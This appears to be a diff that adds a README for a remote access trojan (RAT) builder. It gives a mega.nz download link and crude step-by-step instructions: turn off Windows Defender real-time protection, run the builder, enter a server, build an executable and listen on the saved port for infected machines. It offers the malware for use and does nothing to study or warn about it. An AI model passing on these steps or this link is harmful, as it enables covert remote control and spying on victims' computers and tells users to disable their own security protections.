@@ -1,0 +1,18 @@
+https://mega.nz/file/Bmt0DT6S#I7jdPOuMGSjrCbL8ozeH-_807C2mvjHETcE4XF9Ia4I
+
+Installation:
+
+step 1:
+  (dont be a fucking retard and say shit like "it says its a virus", ofc its gonna say that if it literally builds virus's)
+step 2:
+  Allow Instalations without windows defender by disabled real time protection and the 2 underneath it.
+step 3: 
+  Run the Builder.
+step 4:
+  Open the builder tab and select ur server and other information
+step 5:
+  Press Build exe
+step 6:
+  Listen in on the same port that u had saved in the builder
+step 7:
+  <3 Rat people
